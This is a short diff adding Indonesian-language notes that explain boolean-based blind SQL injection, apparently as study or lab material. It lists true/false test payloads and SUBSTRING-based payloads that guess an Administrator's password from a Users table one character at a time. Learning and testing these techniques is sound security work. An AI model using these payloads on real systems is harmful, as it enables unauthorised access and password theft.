@@ -1,0 +1,13 @@
+cek dengan cara:
+	- `..' and '1'='1`
+	- `..' and '1'='2`
+opsi pertama akan memberikan return message karena kondisi adalah true, sedangkan opsi kedua tidak memberikan return message karena kondisi adalah false.
+
+contohnya, kita dapat melakukan password pada skenario yang mirip seperti berikut. Misalkan terdapat tabel `Users` dan memiliki kolom `Username` dan `Password` serta didalamnya terdapat user `Administrator`. Kita dapat melakukan password guessing dengan command:
+	-`...' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+command tersebut akan memberikan return message karena karakter awal dari password lebih besar dari `m`
+	-`...' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
+command tersebut tidak akan memberikan return message karena karakter awal dari password tidak lebih besar dari `t`
+beberapa db menggunakan `SUBSTR` daripada `SUBSTRING`
+
+
